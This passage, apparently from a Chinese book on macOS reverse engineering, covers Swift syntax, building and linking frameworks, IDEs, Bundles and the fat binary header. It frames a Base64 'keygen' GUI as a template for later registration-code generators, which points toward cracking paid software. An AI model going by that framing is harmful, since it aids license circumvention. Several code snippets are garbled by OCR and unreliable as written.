        items.removeLast()
    }
}

var stk = MyStack<Int>()
for i in 1...10 {
    stk.push(i)
}

while (stk.top() != nil)
{

print(stk.top())
stk.pop()
}

在无法推导出泛型参数具体类型的情况下，泛型类允许手动给定泛型参数的类型。如果想要自动推导出泛型类的泛型参数，则必须在构造函数中使用该泛型参数：

class Foo<T> {
    var bar:T
    init(val:T){
        bar = val
    }
}
let foo = Foo(val: 1)
这样在使用Foo的时候就可以不用写明具体的泛型参数的类型。

# 11. 扩展

扩展可以在不修改类、结构体、协议或者枚举原来定义的基础上为其增加新的内容，定义扩展的关键字为extension，比如要扩展一个结构体：

struct Foo {
    var a = 0;
}

extension Foo {
    func printSelf() {
        print(self.a)
    }
}

var foo = Foo()
foo.a = 10
foo.printSelf()

在extension中编写的代码与直接在Foo结构体中编写的并没有差别,并且也可以使用Foo结构体中的其他成员。类、协议和枚举类型的扩展与扩展结构体类似,此处不再赘述。

# 12. 模块与源文件

在前面的章节中，我们一直在Playground中编写代码，只使用了一个源文件，并且没有引入其他的模块。接下来将学习怎样在Swift中使用多个源文件和bundle及framework。由于Palyground不支持多个源文件，因此如果要编写包含多个源文件的代码，就需要创建一个完整的工程。

创建Swift工程的过程与创建Objective-C工程的过程基本上是一样的，只需要将语言选择为Swift即可。

# 0 多个源文件

在Swift中使用多个源文件不需要像C和Objective-C那样包含头文件，在同一个工程中的源文

件可以直接使用其他源文件中定义的类型以及全局的函数和变量。

##### ○ 模块

Swift中的一个模块就是一个bundle，一般工程中引入的每个framework就是一个模块，framework属于bundle的一种。当一个工程要引入外部的模块时，首先需要在链接选项中添加该模块，然后在模块的原文件中加一条import语句。

##### 访问控制

Swift的访问控制与其他语言差别比较大，Swift中有public、internal和private这3种访问级别，没有注明访问级别时默认是internal，但是这3种访问级别并不是建立在类和继承的基础之上的，而是与模块和源文件有关。访问级别的作用如表3-3所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>同一源文件</td><td style='text-align: center; word-wrap: break-word;'>同一模块不同文件</td><td style='text-align: center; word-wrap: break-word;'>不同模块</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>public</td><td style='text-align: center; word-wrap: break-word;'>可访问</td><td style='text-align: center; word-wrap: break-word;'>可访问</td><td style='text-align: center; word-wrap: break-word;'>可访问</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>internal</td><td style='text-align: center; word-wrap: break-word;'>可访问</td><td style='text-align: center; word-wrap: break-word;'>可访问</td><td style='text-align: center; word-wrap: break-word;'>不可访问</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>private</td><td style='text-align: center; word-wrap: break-word;'>可访问</td><td style='text-align: center; word-wrap: break-word;'>不可访问</td><td style='text-align: center; word-wrap: break-word;'>不可访问</td></tr></table>

在定义类型时，访问级别的修饰符可以放在类、结构体、枚举或协议等类型的前面，也可以放在变量和函数之前，如下代码所示：

public func foo(a:Int, b:Int) -> Int {
    return a + b
}

public var bar = 1

public class FooBar {
    private func private_func() {
        print("Private func")
    }

    public func public_func() {
        print("public func")
    }

    internal var internal_var = 10
    public init() {}
}

因为访问级别可以修饰的东西比较多，所以有时候会有无效的组合，比如定义了一个public的变量，但是变量的类型是private的；或者定义了一个public的函数，但是函数的参数或者返回值的类型是private的，这就是错误的组合。因为既然无法在外部访问需要的类型，那么能访问这些变量和函数也就没有意义了。

### 3.3 其他语言

可选的其他编程语言还包括C、C++、Java、C#等，下面我们进行简要介绍。

C和C++。相信有逆向经验的朋友一定对这两门古老而又强大的语言不会陌生。简洁有力的语法、极高的性能以及完善的工具链使得这两门语言几乎可以运行在所有的平台上，当然苹果的操作系统也不例外，并且Objective-C与Objective-C++本身就是对C和C++所做的扩展。C++的语法和语言特性在C++11标准之后有了极大的改进，配合Qt等界面库，开发出的应用与原生应用相比毫不逊色。在后面的调试器开发章节，我们将使用C++和Qt进行开发。

Java和C#。这两门语言是当下比较流行的编程语言，其中Java的一大卖点就是跨平台性，配合Swing、Swt以及新出的JavaFX等界面库，可以开发出不错的Mac应用。而C#由于微软前期的政策因素，最初只能在微软的系统上使用，不过随着Mono项目的出现，这一局面逐渐被打破，C#可以通过Mono的运行时和GTK#而在大多数系统上使用，但是仍有WPF这样的重量级库只能在微软的系统中使用。

### 3.4 框架

框架（framework）是macOS系统中特有的库，但它与其他语言的动态库非常相似，有相同的二进制格式。但是框架属于bundle的一种，它将动态库和macOS中特有的一些文件打包到一起，并提供了macOS特有的其他高级特性，因此框架不具有移植性。

在macOS系统中也可以使用通用的静态库和动态库，但是macOS系统提供的API都是基于框架的，并且框架要比普通的库更加通用、方便和强大，因此有必要了解框架的使用。

本节将首先介绍如何开发和使用一个框架，然后介绍macOS系统中常用的一些框架。

#### 3.4.1 框架的开发与使用

首先，创建一个框架工程，在创建工程时选择创建一个 “Cocoa Framework” 工程，语言选择Swift，工程名为 “TestFramework”，如图3-11所示。

 </div>

创建完成后，Xcode会自动创建Info.plist和TestFramework.h两个文件。Info.plist文件在编译完后会被复制到bundle包对应版本的Resource文件夹下，用来描述该bundle的元数据，与Windows系统上的manifest文件作用非常相似。

TestFramework.h则是一个Objective-C的头文件，其中包含该框架的导出接口。如果不使用Objective-C调用该框架，可以不用关心该头文件。

接下来在项目中添加一个Swift文件并添加如下代码：

import Foundation

public func add(a: Int, b: Int) -> Int {
    return a + b
}

public class TestClass {
    public func foo() {
        print("in foo")
    }

    public var bar = 1
    // 默认生成的构造函数是internal的，需要显式地声明为public
    public init() {
    }
}
// 默认访问级别为internal，只能在本模块调用

   </div>

func internal_func() {
    print("in internal_func")
}

// private访问级别，只能在本文件内调用
private func private_func() {
    print("in private_func")
}

以上代码定义了3个全局函数和一个类，其中add函数和TestClass类是对其他模块可见的。要注意的是，即使一个类被声明为public，它的成员变量和成员函数默认也是internal访问级别，仍需要显式地声明为public才可以在其他模块中使用。

编写完成后点击三角符号编译项目，没有问题的话将会显示 “Build Success”。

接下来添加一个Target，用来调用该框架。在Xcode菜单中选择“File→New→Target”，创建一个新的Command Line Tool类型的Target，工程名为“Test”，语言选择Swift。创建完成后，需要将前面编写的框架添加到引用中。

首先在左侧的Project Navigator树状列表中选中“TestFramework”项目的根节点，Xcode的中间部分会显示项目的配置，如图3-12所示。

 </div>

在工程配置的左侧选中 “Test”，注意是工程配置中的而不是Project Navigator中的，然后选中上方的 “Build Phases”，如图3-13所示。

 </div>

展开 “Link Binary With Libraries” 列表，然后将左侧 Project Navigator 中的 “TestFramework.framework” 拖到此列表中，完成后显示结果图 3-14 所示。

   </div>

 </div>

如果还需要添加其他的框架，可以直接从Finder中将其拖入该列表，也可以通过列表下面的加号手动查找。

添加完成后就可以在项目中使用框架了，打开Test中的Main.swift文件，添加如下代码：

import Foundation
import TestFramework

print("add(1,b:2) = \(add(1,b:2))\")

var testClass = TestClass()

testClass.foo()

在编译选项中添加了框架之后，要想在代码中使用添加的框架，需要先导入该框架，导入框架的关键字为import，后面接框架名。导入后就可以正常使用框架中导出的类型、函数或变量等。

添加完代码后，在菜单中选中“Product→Scheme”下的“Test”，告诉编译器要编译并运行Test目标，设置完点击三角形符号，编译并运行Test。在正常情况下，程序应该编译通过并输出运行结果，但是现在发现项目虽然编译通过了，但在运行时会报错：

dyld: Library not loaded: @rpath/libswiftAppKit.dylib

Referenced from:

/Users/xingjunjie/Library/Developer/XCode/DerivedData/TestFramework-bscbdxynfloqjaeevfszolugvgo/Build/Products/Debug/TestFramework.framework/Versions/A/TestFramework

Reason: image not found

错误提示无法找到“libswiftAppKit.dylib”动态库。如果创建的是Cocoa项目，Xcode会自动把与Swift相关的dylib复制到app包中的Frameworks中，但是命令行项目并不会自动帮你复制，于是需要自己动手，方式如下。

(1) 首先在Test的“Build Settings”中搜索“Runpath”，在“Runpath Search Paths”中添加新的搜索路径“@excutable_path”，如图3-15所示。

 </div>

(2) 添加缺少的动态库。缺少的动态库都放在Xcode包中，根据出错提示将其手动复制到程序所在目录即可。具体位置是在/Applications/XCode.app/Contents/Developer/Toolchains/XCodeDefault.xctoolchain/usr/lib/swift目录下，可以在Finder中打开“应用程序”文件夹，

找到Xcode图标并右键选择“显示包内容”，然后打开对应的子目录。笔者测试需要以下10个动态库：

libswiftAppKit.dylib
libswiftCore.dylib
libswiftCoreData.dylib
libswiftCoreGraphics.dylib
libswiftCoreImage.dylib
libswiftDarwin.dylib
libswiftDispatch.dylib
libswiftFoundation.dylib
libswiftIOKit.dylib
libswiftObjectiveC.dylib

复制完即可正常运行，希望新版本的Xcode能修正该缺陷。

#### 3.4.2 在 Objective-C 中使用 Swift 编写的框架

要在Objective-C中使用Swift的框架很简单，只需要对原来的代码做如下修改：

@objc public class TestClass : NSObject {
    public func foo() {
        print("in foo")
    }

    public var bar = 1
    // 默认生成的构造函数是internal的，需要显式地声明为public
    public override init() {}
}

与原来的代码相比，只是在TestClass前面加了一个@objc，然后让它继承自NSObject类，就能在Objective-C中使用该类了。

不过@objc关键字只支持类和协议，因此，只能将一个类导出给Objective-C使用。修改完成后编译该框架，如果到生成的框架的包中进行查看，会发现在header文件夹下自动生成了一个TestFramework-Swift.h的头文件，其中的内容就是TestClass类的声明，这是在Objective-C中自动生成的。

接下来，新建一个命令行的Target，语言选择Objective-C，名称为“TestOC”。然后添加对框架的引用，修改Runpath Search Path，这部分与Swift的工程基本一致，此处不再赘述。

在Objective中使用外部框架需要用关键字@import，注意行尾要加分号。@import会自动导入必要的头文件，接下来就可以直接使用框架中提供的类了，修改main.m中的源代码，如下所示：

#import <Foundation/Foundation.h>
@import TestFramework;

int main(int argc, const char * argv[]) {

TestClass* test = [[TestClass alloc] init];
[test foo];
NSLog(@ "%ld", (long)test.bar);
return 0;
}

编译并运行TestOC，没有问题的话会输出如下结果：

in foo
2016-05-25 00:32:50.555 TestOC[4502:170898] 1
Program ended with exit code: 0

#### 3.4.3 常用的框架

本节将介绍一些开发中经常用到的框架，框架的介绍信息来自苹果官方网站。

☐ Cocoa。Cocoa框架是macOS中最为重要的一个框架，它本身由3个子框架组成。

□ Appkit: AppKit框架包含了所有构建图形化用户界面的组件，比如窗口、按钮、菜单、滚动条文本框等，还包含了与绘图相关的API。

☐ Foundation：该框架为应用提供了底层的数据结构支持，比如NSObject类和数组、字典等基础数据结构都是由该框架提供的。

☐ CoreData：该框架主要用于管理数据模型，提供API存储数据，提供undo/redo功能等。

Core Foundation。CoreFoundation与Foundation框架功能相同，但不同的是Foundation框架提供的是Objective-C的接口，CoreFoundation提供的是C的接口。

Core Graphics。该框架提供2D绘图相关的接口，包括图形上下文、加载图像、绘制图像，等等。

☐ Core Animation。该框架的主要功能是提供帮助开发者实现动画效果的接口。

☐ 第三方框架。

### 3.5 第三方开发工具

除了官方提供的Xcode开发工具与框架外，还可以使用第三方开发工具来完成macOS上的软件开发。第三方工具主要有Qt Creator、Xamarin Studio、JetBrains系列开发工具以及Visual Studio Code。下面我们分别进行介绍。

### 3.5.1 Qt Creator

Qt Creator $ ^{①} $是一款专为Qt界面库打造的跨平台IDE，其功能包括项目生成向导、C++代码编辑器、浏览文件及类的工具、集成了Qt Designer、Qt Assistant、Qt Linguist、图形化的调试工具，

集成qmake构建工具等。即使不开发Qt应用，也可以将其作为通用的C++ IDE使用。Qt Creator界面如图3-16所示。

O

 </div>

### 3.5.2 Xamarin Studio

Xamarin Studio $ ^{®} $原名Monodevelop，是一款跨平台的软件开发IDE，基于Mono和Gtk#构建，4.2.2版本之后更名为Xamarin Studio。Xamarin Studio主要被用来作为基于Mono/.NET Framework语言的IDE，主要支持的语言有C#、F#、C++和Python等，但是由于其强大的插件机制，也可以通过安装插件来支持其他语言。Xamarin Studio运行效果如图3-17所示。

   </div>

 </div>

#### 3.5.3 JetBrains 系列开发工具

JetBrains是一家捷克的软件开发公司，主要经营的产品是基于IntelliJ IDEA开发的一系列IDE，该公司的IDE官方支持的语言有C#、C/C++、Java、Scala、Swift、Objective-C、JavaScript等十多种，通过插件扩展可以支持几乎所有主流的编程语言。

Google新版本的Android开发环境Android Studio也是基于该公司的IntelliJ IDEA开发的，足以表明IDEA系列IDE的强大。JetBrains系列的IDE如图3-18所示，用于Objective-C/Swift开发的工具是AppCode $ ^{①} $，它号称是可以代替Xcode的功能更强大的开发工具，不过它是收费的，只有30天的免费试用期。

 </div>

#### 3.5.4 Visual Studio Code

Visual Studio Code是微软开发的一款跨平台的代码编辑器。它也是一款轻量级的IDE，通过插件扩展的方式，可以支持几乎所有常见的编辑语言。代码高亮、自动完成、语法检查、调试等功能一个也不少，通过配置与扩展，有人甚至使用它来动态调试Unity3D游戏的代码与播放MKV格式的电影，可见它的扩展性之强。Visual Studio Code也支持Markdown文档的编辑与预览，笔者就是使用它来完成本书的编写工作的。Visual Studio Code的运行界面如图3-19所示。

 </div>

### 3.6 完整的 Cocoa GUI 程序

至此，我们系统地学习了在macOS上开发应用所需要的各种技术和开发环境，但是纸上得来终觉浅，接下来就综合应用这些技术来开发一个简单的应用程序，更好地了解一个macOS应用的基础结构和开发流程。

接下来要编写的应用是一个“注册机”，实际上我们并不会真的去分析某个应用的注册算法来实现一个注册机，只是编写一个注册机的界面，接收用户输入的机器码并进行Base64编码，作为注册码显示给用户。后面编写注册机程序时可以复用整个工程，将原来的Base64编码替换为真正的注册算法即可。

   </div>

#### 3.6.1 创建工程

首先创建一个新的工程，选择创建一个“Cocoa Application”类型的工程，工程名为“KeygenDemo”，语言选择Swift。创建完成后，Xcode会自动生成工程代码，编译并运行生成的代码，会得到一个空白的窗口，如图3-20所示。

 </div>

接下来在该程序的基础上进行开发，添加需要的控件，并为控件添加相应事件的代码。

#### 3.6.2 Storyboard 和 xib

Storyboard和xib都是Xcode中的界面文件，这两种文件类似于Windows上的rc资源文件，可以用来定义用户界面。

在早期的Xcode中使用的界面文件是xib文件。xib文件的内容格式为xml，可以在Xcode中通过界面编辑器直接进行可视化的界面编辑。在Xcode Interface Builder中设计好界面后，Xcode会将窗口和空间的各种属性保存到xib文件中。xib通过编译生成nib文件，当程序需要显示界面时可以加载并解析文件内容，然后显示设计好的窗口。

nib文件是一种二进制文件，不可以直接编辑，但是有一些工具可以将其反编译成可读的xib文本。

Storyboard是苹果新推出的用于替代xib的新一代界面文件，它与xib的主要区别是一个xib文件只能对应一个窗口控制器或视图控制器，因此一个工程中可能会有多个xib文件，而一个Storyboard可以看作是由多个xib文件组成的，可以对应多个控制器，因此一个工程中一般只有一个Storyboard文件。Storyboard文件对应的二进制版本是storyboardc, storyboardc其实是一个文件夹，其内部存放的也是nib文件。

了解了Storyboard和Xib文件后，就可以开始编辑界面了。在Xcode左侧选中“Main.storyboard”

文件，中间部分会显示Storyboard中的菜单和窗口，如图3-21所示。

 </div>

Storyboard中的内容从上到下依次是程序的菜单、窗口控制器和视图控制器。控件都是放在视图控制器上的，一个Storyboard中可以放多个视图控制器，不过本程序是单视图应用，使用默认的视图控制器就足够了。接下来往界面上绘制所需要的控件。

首先，在界面上添加一个Image View控件用来显示图片，在Xcode右下角的库列表中选择“Show the Object library”图标，会列出来当前所有可用的控件。但是一般会有很多控件可用，可以在下方的Filter中输入“image view”进行查找，如图3-22所示。查到后将该控件拖到视图控制器上，并调整控件的大小。

   </div>

 </div>

其次，向工程中添加一个图片用于在Image View中显示。可以直接在Finder中将图片拖到左侧的“Project Navigator”中，会弹出一个对话框询问添加选项，默认情况下直接确定即可。添加完成后在右侧的属性列表中点击“Attributes Inspector”下的Image下拉列表，选择刚添加的图片，如图3-23所示。然后将Scaling属性设置为“Axes Idependently”，让图片缩放以适应Image View。

 </div>

最后，以同样的方式查找并添加文本框（Text Failed）、标签（Label）和按钮（Push Button）控件，并修改标签和按钮的Title属性为想要的文字。完成后的效果如图3-24所示。

 </div>

#### 3.6.3 Outlet 和 Action 机制

设计完界面之后就可以添加相关的代码了, Xcode中使用Outlet & Action机制将代码与界面文件关联起来。@IBOutlet用来标注控件在视图控制器代码中对应的变量, @IBAction则用来标注控件的事件回调函数。

在Storyboard中的每一个界面控制器都有自己对应的类，该类需要继承自NSViewController。可以通过查看界面控制器的Class属性来找到其对应的类，如图3-25所示。

 </div>

ViewController是Xcode自动生成的一个类，接下来要在ViewController中添加两个输入框对应的成员变量，方便后面获取和设置输入框中的文本。

首先需要将界面设计器和代码窗口同时显示，点击Xcode右上角的“Show the Assistant editor”按钮（就是两个圆环图标的按钮），将设计视图和代码试图分窗口显示，默认是左右显示的，笔者喜欢改成上下显示，可以点击圆环按钮右下角的三角形选择“Assistant Editors on Bottom”，如图3-26所示。

 </div>

然后按住control键并用鼠标将第一个编辑框拖到ViewController类中可以添加成员变量的地方并松开鼠标，Xcode会提示你创建Outlet或者Action，如图3-27所示。

 </div>

Connection选项可以选择是创建Outlet还是Action，此处要创建的是控件对应的变量，因此选择Outlet。Name是变量名，Type是变量类型，Storage表示变量是强引用还是弱引用等。一般Xcode会自动选择好，默认即可，点击Connect按钮就可以创建空间对应的变量了。

创建的变量与普通成员变量相比只是在前面多了一个@IBOutlet修饰符，后面就可以直接通过该变量操作对应的控件了。接下来用同样的方法为另一个文本框添加一个名为serialCode的变量，对于“生成”按钮，则需要在连接的时候将Connection选项选择为Action，Name设置为onGenerate，Xcode会自动生成一个带@IBAction修饰的函数，点击按钮的时候会调用该函数。

接下来在生成的onGenerate函数中添加代码，获取机器码文本框中的内容进行Base64编码，并将结果显示到序列号文本框中，在Swift中可以用一句代码完成该操作，如下所示：

machineCodeEdit.stringValue是一个计算属性，类型为String，用来获取或设置文本框中的内容。获取到机器码文本框中的文本后，用dataUsingEncoding()方法将字符串转换成utf8格式的NSData数据，最后调用NSData的base64EncodedStringWithOptions()方法对数据进行base64编码，

并在序列号文本框中进行显示。

至此，第一个macOS的GUI程序就完成了，可以点击三角形按钮编译并运行，运行效果如图3-28所示。

 </div>

### 3.7 本章小结

本章主要介绍了Objective-C与Swift语言基本的语法，这两种语言目前是macOS系统上开发软件使用频率最高的编程语言，本书后面章节中的演示程序以及需要分析的目标程序，都是使用这两种语言开发的。在macOS平台上做软件逆向分析，掌握这两种语言的基础语法与开发相关的知识是非常必要的。

   </div>

# 软件内幕

对于一个操作系统来说，对其影响最大的莫过于运行其上的软件了。正因为有了这些形形色色的软件，操作系统才得以广泛应用。与Linux、Windows等主流操作系统一样，运行在macOS上的软件也有着独有的特点。

macOS上的软件有着独特的UI界面与操作方式。macOS的设计师一直秉承着独特的设计理念，设计出的Aqua界面别具风格。银灰的金属色主题是分辨macOS系统最快捷的方式。Windows界面通常将最小化按钮与关闭按钮设置到窗口右上角，而在Aqua界面上则位于软件的左上角，并且使用全屏按钮替换了Windows上的最大化按钮。进入全屏模式的软件会新开一个窗口，占据屏幕的全部空间，可以在触摸板上使用3根手指左右划动来切换不同的全屏窗口。

每个常规的Aqua界面上的程序都有一个菜单，菜单显示在用户屏幕的顶端，菜单的最左边始终是一个苹果图标，点击它会弹出系统设置、App Store、关机、重启等多个选项。

macOS使用Dock栏来管理显示常用的软件，它位于用户屏幕的底部，展示效果与Windows的任务栏类似。正在运行的macOS界面程序都可以在Dock上点击右键，在弹出的菜单中选择Options→Keep in Dock，将程序在Dock上保留下来，以后就可以直接从Dock中点击图标启动程序了。

在Windows系统中，用户可以使用开始菜单→所有程序来找到系统中安装的软件并启动它，macOS中则提供了一个Launchpad程序来管理安装在/Applications目录中的软件。Launchpad移植于iOS系统中的SpringBoard，展示的效果也与之类似，它以全屏网格形式的界面显示了所有可以运行的软件与系统工具。如果软件安装过多，会以多个页面展示。点击Dock上的Launchpad图标可以启动它，使用两根手指左右划动可以在不同的页面间切换，如图4-1所示。

 </div>

### 4.1 可执行文件

除了 Aqua 界面的程序，macOS 还可以运行很多其他种类的文件，本书将所有可以运行在 macOS 系统上的文件统称为 macOS 可执行文件。

首先是脚本，macOS提供了UNIX系统中的Shell环境来支持运行脚本与命令行程序。脚本实质上是一个文本文件，在脚本文件中指定运行它的解释器后，Shell在运行脚本时会调用解释器来解释运行它。任何一个文件都可以通过执行`chmod+x`命令给它加上可执行权限，拥有可执行权限的文件并不一定能够执行，只有满足某种解释器的语法规则才算得上是可执行文件。

除了主流的几种Shell脚本支持外，macOS还内置了目前比较流行的Perl、Python和Ruby等脚本的解释器，任何人都可以通过编写这些脚本并调用它们的解释器来运行，不需要安装额外的软件。

另外，苹果公司还开发了一种脚本：AppleScript（苹果脚本）。它用于运行macOS上的程序并实行自动化工作。苹果提供了一个单独的脚本编辑器来开发与调试AppleScript。它位于/Applications/Utilities/Script Editor中。使用Script Editor编写好的脚本保存的格式为scpt。随着macOS系统的不断升级，AppleScript也在不停地发展，目前甚至可以使用AppleScript来开发macOS上的界面程序。具体的步骤是在Xcode中选择File→New→Project，在打开的对话框中选择Other→Cocoa-AppleScript。有兴趣的读者可以阅读官方文档来深入了解AppleScript $ ^{®} $。

除了脚本外，可执行文件还包括可以由用户主动执行的程序与被动执行的程序文件。

主动执行的程序包括：GUI界面程序、命令行程序、游戏等；被动执行的程序包括被系统调用的程序，如Quick Look插件、屏幕保护程序、内核驱动与扩展等，以及被程序调用的框架、库、

Bundle、XPC服务等。所有这些可执行文件都使用苹果独有的可执行文件格式：Mach-O。关于Mach-O文件的格式，我们将在本章后面的小节中进行详细讲解。

### 4.2 下载与安装软件

苹果支持从App Store应用商店直接安装软件，也支持从第三方渠道（如其他磁盘介质、网络）下载来安装软件。从App Store下载软件是最方便快捷也是最安全的一种方式，苹果公司一向以软件审查严格闻名，应用商店中的应用软件在界面、功能以及对系统资源的使用上，都是经过严格审查与限制的。对于普通用户来说，这种下载方式最合适不过了。但对于专业用户来说，由于一些专业软件因为用户授权协议、资源访问或其他原因未能在App Store上架，就只能通过网络或第三方渠道来获取了。

#### 4.2.1 免费与付费软件

App Store应用商店提供了丰富的免费与付费的软件供用户下载使用。下载免费的软件不需要用户付出额外的成本，只需要到官网https://appleid.apple.com/注册一个账号，登录App Store就可以下载了。

如果要下载App Store中的收费软件，则需要为账号绑定一张银行卡，购买软件成功后会直接从银行卡中扣取费用。另外，App Store中的软件还支持另一种收费方式：In-App Purchase（应用内付费），简称IAP。这种收费方式在苹果自家的iOS系统中应用非常广泛，它允许开发人员将软件的某些特定功能设定为需要购买才能使用。目前，很多软件开发商以此平台作为主要的软件收入来源。

App Store中的收费软件只有IAP与直接购买这两种方式，而网络下载的收费软件的付费形式则丰富很多。部分软件官网只提供软件基础功能的演示版本供用户下载，如果需要使用正式版本，则需要联系软件开发商购买完整版本。例如著名的反汇编软件IDA Pro，官网就只提供了Demo版本可供下载 $ ^{①} $，正式版本需要找软件开发商或代理商购买。也有些软件的官网会提供完整版本下载，但会有使用时间或功能限制。如果需要正常无限制使用软件，则需要购买软件授权，如反汇编软件Hopper $ ^{②} $。还有部分软件与传统Windows付费软件一样，使用用户名与注册码的形式来售卖软件，如010 Editor $ ^{③} $。

#### 4.2.2 安装软件

普通的macOS软件只是一个以扩展名.app结尾的目录,这种目录有着特定的组织结构,macOS

称之为Bundle。安装这类软件只需要将Bundle复制到系统的/Applications目录下即可。复制完成后，Launchpad面板会自动更新安装好的软件图标，启动软件不需要到/Applications目录中寻找，只需要打开Launchpad，找到软件的图标，点击就可以运行该程序了。

从网络上下载的软件通常是经过打包后发布的，普通的软件常常通过zip或其他方式压缩，以压缩包的形式提供下载，还有的使用磁盘工具将软件打包成一个dmg磁盘镜像文件，这类dmg文件内通常还会有一个Applications目录的软链接，安装的时候，只需要将dmg中的软件拖放到该软链接上就算完成安装了。图4-2是AppDelete的安装镜像。

 </div>

macOS上的软件还有一种以pkg或mpkg结尾的安装包，类似于Windows系统上的msi或exe安装程序，通过不停地点击下一步就可以完成安装，这类软件除了将主程序写入/Applications目录外，一般还会在系统上做一些只有具有管理员权限才能完成的动作，比如，为特定的目录或文件创建软链接、安装与卸载内核扩展、复制命令行程序到用户可执行文件目录/usr/local/bin中，等等。因此，在安装的过程中，可能会提示输入管理员用户名与密码来执行需要Root权限的操作。

另一种是命令行工具，这类程序的安装使用第1章中介绍的Homebrew即可，此处不再赘述。

## 4.3 Bundle

Bundle是苹果系统独有的特色，苹果系统中大量使用了Bundle。本节我们会简要介绍Bundle目录结构以及如何在代码中访问Bundle。

#### 4.3.1 Bundle 目录结构

安装到macOS系统上的软件有着特定的格式，通常是以.app扩展名结尾的Bundle目录结构。

Bundle有着固定的组织格式，在Finder中查看Bundle的目录内容，可以在程序上点击右键，在弹出的菜单中选择Show Package Contents。例如，/Applications目录下的App Store的目录结构如图4-3所示。

 </div>

在App Store.app目录下，只有一个Contents子目录，所有软件的内容都在此目录下。

□ CodeSignature 目录。此目录下只有一个CodeResources文件，它是一个plist格式的文件，保存了软件包中所有文件的签名信息。

□ Info.plist文件。此文件记录了软件的一些信息，如软件构建的机器版本BuildMachineOSBuild、可执行文件名CFBundleExecutable、软件的标识CFBundleIdentifier、软件包名CFBundleName等。

☐ MacOS目录。此目录存放了可执行文件。

☐ PkgInfo文件。软件包的8字节标识符。

□ Resources目录。软件运行所需要的资源，包括.lproj本地化资源、.nib资源、图片、字体、声音、文档以及其他文件。

□ Plugins目录。插件目录，存放了软件用到的插件。插件也是使用Bundle目录结构进行组织的一种程序。

除了 Plugins 目录外，根据软件需求与实现的不同，Contents 下可能还会有 Frameworks 与 XPC Services 目录。其中，Frameworks 里存放了软件需要用到的框架，它是以 .framework 结尾的 Bundle 结构；XPC Services 则存放了软件用到的 XPC 服务，它是以 .xpc 结尾的 Bundle 结构。还有一种以 .bundle 扩展名结尾的 Bundle，它是“纯粹”的 Bundle，目录结构与其他的 Bundle 无异，存放的内容可以是二进制代码，可以是资源，也可以二者同时存放。如果存放二进制代码的话，可供程序在代码中使用 dopen() 函数打开，这种 Bundle 通常用于制作软件的插件，存放在软件 Bundle 的 Resources 目录下。

#### 4.3.2 在代码中访问 Bundle

在程序中，开发人员可以使用Cocoa框架提供的NSBundle类来获取程序的Bundle信息。调用NSBundle的mainBundle()方法可以返回当前程序的主Bundle对象，调用方法如下：

NSBundle *bundle = [NSBundle mainBundle]

使用主Bundle对象的infoDictionary()方法可以访问软件Bundle目录下Info.plist文件中的信息，它返回的是一个字典对象。以下是获取程序标识符的代码：

[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"]

使用主Bundle对象的pathForResource()方法可以访问Bundle目录下任意资源文件。以下是访问Bundle根目录下的monkey.png文件：

NString *monkey = [[NSBundle mainBundle] pathForResource:@"monkey" ofType:@"png";

与主Bundle对应的是自定义Bundle，这一类Bundle的访问可以使用以下方式调用：

NSString *resourceBundle = [[NSBundle mainBundle] pathForResource：《ResPack" ofType：《"bundle"]；NSLog(@"resourceBundle: %@", resourceBundle);
NSString *monkey = [[NSBundle bundleWithPath:resourceBundle] pathForResource：《"monkey" ofType：《"png" inDirectory：《Images"]；
NSLog(@"monkey path: %@", monkey);

这段代码访问了ResPack.bundle中Images目录下的monkey.png文件。

### 4.4 通用二进制格式

虽然macOS系统使用了很多UNIX上的特性，但它并没有使用ELF作为系统的可执行文件格式，而是使用独创的Mach-O文件格式。

macOS系统支持的CPU及硬件平台发生了很大的变化，从早期的PowerPC平台，到后来的x86，再到现在主流的ARM、x86-64平台。软件开发人员为了保证不同硬件平台的兼容性，需要为每一个平台编译一个可执行文件，这是非常繁琐的。为了解决软件在多个硬件平台上的兼容性问题，苹果开发了一个通用的二进制文件格式（Universal Binary），又称为胖二进制（Fat Binary）。通用二进制文件将多个支持不同CPU架构的二进制文件打包成一个文件，系统在加载运行该程序时，会根据通用二进制文件中提供的多个架构来与当前系统平台做匹配，运行适合当前系统的那个版本。

苹果系统中存在着很多通用二进制文件，比如/usr/bin/python，在终端中执行file命令可以查看它的信息：

$ file /usr/bin/python
/usr/bin/python: Mach-0 universal binary with 2 architectures
/usr/bin/python (for architecture x86_64): Mach-0 64-bit executable x86_64
/usr/bin/python (for architecture i386): Mach-0 executable i386

   </div>

系统提供了一个命令行工具Lipo来操作通用二进制文件。它可以添加、提取、删除以及替换通用二进制文件中特定架构的二进制版本。例如提取python中x86_64版本的二进制文件可以执行：

lipo /usr/bin/python -extract x86_64 -output ~/Desktop/python.x64

删除x86版本的二进制文件可以执行：

lipo /usr/bin/python -remove i386 -output ~/Desktop/python.x64

或者直接瘦身为x86_64版本：

lpo /usr/bin/python -thin x86_64 -output ~/Desktop/python.x64

通用二进制文件不止针对可以直接运行的可执行程序，系统中的动态库dylib、静态库.a文件以及框架等都可以是通用二进制文件，对它们同样可以使用Lipo命令来进行管理。

下来看一下通用二进制的文件格式。安装好macOS程序开发的SDK，或者在xnu的内核源代码中，都可以在文件中找到通用二进制文件格式的声明。从文件命名上看，将通用二进制称为胖二进制更方便一些。胖二进制头部结构fat_header定义如下：

#define FAT_MAGIC 0xcafebabe
#define FAT_CIGAM 0xbebafeca

struct fat_header {
    uint32_t magic;
    uint32_t nfat_arch;
};

magic字段被定义为常量FAT_MAGIC，它的取值是固定的：0xcafebabe，表示这是一个通用的二进制文件。nfat_arch字段指明了通用二进制中包含多少个Mach-O文件。

每个通用二进制架构信息都使用fat_arch结构表示，在fat_header结构体之后，紧接着是一个或多个连续的fat_arch结构体，它的定义如下：

struct fat_arch {
    cpu_type_t cputype;
    cpu_subtype_t cpusubtype;
    uint32_t offset;
    uint32_t size;
    uint32_t align;
};

cputype指定了具体的CPU类型，它的类型是cpu_type_t，定义位于mach/machine.h中。CPU的常用类型主要有如下几种：

#define CPU_TYPE_X86 ((cpu_type_t) 7)
#define CPU_TYPE_I386 CPU_TYPE_X86
#define CPU_TYPE_X86_64 (CPU_TYPE_X86 | CPU_ARCH_ABI64)
#define CPU_TYPE_MC98000 ((cpu_type_t) 10)
